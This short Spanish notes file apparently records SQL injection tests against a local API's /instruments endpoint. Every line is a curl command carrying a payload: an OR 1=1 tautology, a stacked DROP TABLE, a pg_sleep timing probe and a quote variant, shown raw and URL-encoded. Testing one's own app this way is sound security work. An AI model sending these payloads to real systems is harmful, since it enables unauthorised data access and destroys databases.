# PAYLOADS DE GEMINI NO FUNCIONAN

# Intentará obtener un instrumento, pero la inyección puede listar todos o causar un error.
curl -X GET http://localhost:8080/instruments/1%20OR%201=1%20--

# Payload original: 1 OR 1=1 --
# Codificado para URL: 1%20OR%201%3D1%20--
curl -X GET "http://localhost:8080/instruments/1%20OR%201%3D1%20--"



# Payload original: 1; DROP TABLE instruments; --
# Codificado para URL: 1%3B%20DROP%20TABLE%20instruments%3B%20--
curl -X GET "http://localhost:8080/instruments/1%3B%20DROP%20TABLE%20instruments%3B%20--"



# Payload original: 1; SELECT pg_sleep(5); --
# Codificado para URL: 1%3B%20SELECT%20pg_sleep%285%29%3B%20--
curl -X GET "http://localhost:8080/instruments/1%3B%20SELECT%20pg_sleep%285%29%3B%20--"



GET /instruments/1 OR 1=1 --
curl -X GET "http://localhost:8080/instruments/1%27%20OR%201%3D1%20--"